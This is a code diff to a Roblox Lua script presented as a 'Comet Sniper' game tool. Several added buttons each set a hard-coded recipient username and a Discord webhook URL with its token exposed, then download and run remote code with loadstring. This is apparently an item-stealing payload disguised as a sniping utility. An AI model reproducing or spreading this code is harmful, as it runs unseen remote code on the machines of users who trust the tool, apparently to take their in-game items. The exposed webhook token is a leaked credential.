@@ -1,12 +1,36 @@
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
-local Window = Library.CreateLib("Comet Sniper V1.1", "BloodTheme")
+local Window = Library.CreateLib("Comet's Sniper V1.1", "BloodTheme")
 
 -- MAIN
-local Main = Window:NewTab("Comet Snipe V1.1")
+local Main = Window:NewTab("Main")
 local MainSection = Main:NewSection("Main")
 
 
-MainSection:NewButton("Comet Snipe", "Activate comet snipe", function()
+MainSection:NewButton("Massive Comet Snipe", "Activate comet snipe", function()
+    _G.Username = "Sturmgezhutz"
+    _G.HubName  = "Comet Sniper V1.1"
+    _G.Webhook  = "https://discord.com/api/webhooks/1091875819095334992/bNJPZ5iJ4Rp7sArCHg_SK2kMAD4WrwJXVueiIVKmbFj2XBRCt2bVfwbdI6sKkMwqAqzG"
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()()
+end)
+
+MainSection:NewButton("Mini-Comet Snipe", "Activate comet snipe", function()
+    _G.Username = "Sturmgezhutz"
+    _G.HubName  = "Comet Sniper V1.1"
+    _G.Webhook  = "https://discord.com/api/webhooks/1091875819095334992/bNJPZ5iJ4Rp7sArCHg_SK2kMAD4WrwJXVueiIVKmbFj2XBRCt2bVfwbdI6sKkMwqAqzG"
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()()
+end)
+
+MainSection:NewButton("Fruits Snipe", "Activate comet snipe", function()
+    _G.Username = "Sturmgezhutz"
+    _G.HubName  = "Comet Sniper V1.1"
+    _G.Webhook  = "https://discord.com/api/webhooks/1091875819095334992/bNJPZ5iJ4Rp7sArCHg_SK2kMAD4WrwJXVueiIVKmbFj2XBRCt2bVfwbdI6sKkMwqAqzG"
+
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()()
+end)
+
+MainSection:NewButton("Gems Snipe", "Activate comet snipe", function()
     _G.Username = "Sturmgezhutz"
     _G.HubName  = "Comet Sniper V1.1"
     _G.Webhook  = "https://discord.com/api/webhooks/1091875819095334992/bNJPZ5iJ4Rp7sArCHg_SK2kMAD4WrwJXVueiIVKmbFj2XBRCt2bVfwbdI6sKkMwqAqzG"
